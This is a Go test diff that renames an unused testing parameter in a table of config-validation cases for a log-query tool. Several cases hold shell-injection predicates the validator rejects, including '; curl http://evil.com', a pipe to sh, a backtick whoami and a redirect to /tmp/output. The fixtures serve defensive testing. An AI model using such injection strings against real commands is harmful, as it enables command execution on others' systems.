@@ -23,7 +23,7 @@ func TestConfigValidate(t *testing.T) {
 	}{
 		{
 			desc: "valid config - live mode",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					MaxPollInterval: 50 * time.Second,
 					MaxLogAge:       12 * time.Hour,
@@ -41,7 +41,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "invalid archive path - not a directory",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					ArchivePath: "./README.md",
 				}
@@ -59,7 +59,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "end time requires archive path",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					EndTime: "2024-01-02 00:00:00",
 				}
@@ -68,7 +68,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "valid predicate with AND",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == 'com.apple.example' AND messageType == 'Error'",
 				}
@@ -76,7 +76,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "valid predicate with && (normalized to AND)",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == 'com.apple.example' && messageType == 'Error'",
 				}
@@ -84,7 +84,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "valid predicate with || (normalized to OR)",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == 'com.apple.example' || messageType == 'Error'",
 				}
@@ -92,7 +92,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "valid predicate with comparison operators",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "processID > 100 && processID < 1000",
 				}
@@ -100,7 +100,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "valid predicate with > comparison and spaces",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "processID >100",
 				}
@@ -108,7 +108,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "invalid predicate - semicolon",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == 'test'; curl http://evil.com",
 				}
@@ -117,7 +117,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "invalid predicate - pipe",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == 'test' | sh",
 				}
@@ -126,7 +126,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "invalid predicate - dollar sign",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == '$HOME'",
 				}
@@ -135,7 +135,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "invalid predicate - backtick",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == '`whoami`'",
 				}
@@ -144,7 +144,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "invalid predicate - append redirect",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem == 'test' >> /tmp/output",
 				}
@@ -153,7 +153,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "predicate must contain valid field name",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "unknownField == 'value'",
 				}
@@ -162,7 +162,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "predicate must contain operator",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "subsystem 'com.apple'",
 				}
@@ -171,7 +171,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "predicate must contain valid event type when type is referenced",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "type == 'invalidEvent'",
 				}
@@ -180,7 +180,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "predicate must contain valid log type when logType is referenced",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "logType == 'invalid'",
 				}
@@ -189,7 +189,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "predicate must contain valid signpost scope when signpostScope is referenced",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "signpostScope == 'invalid'",
 				}
@@ -198,7 +198,7 @@ func TestConfigValidate(t *testing.T) {
 		},
 		{
 			desc: "predicate must contain valid signpost type when signpostType is referenced",
-			makeCfg: func(t *testing.T) *Config {
+			makeCfg: func(_ *testing.T) *Config {
 				return &Config{
 					Predicate: "signpostType == 'invalid'",
 				}
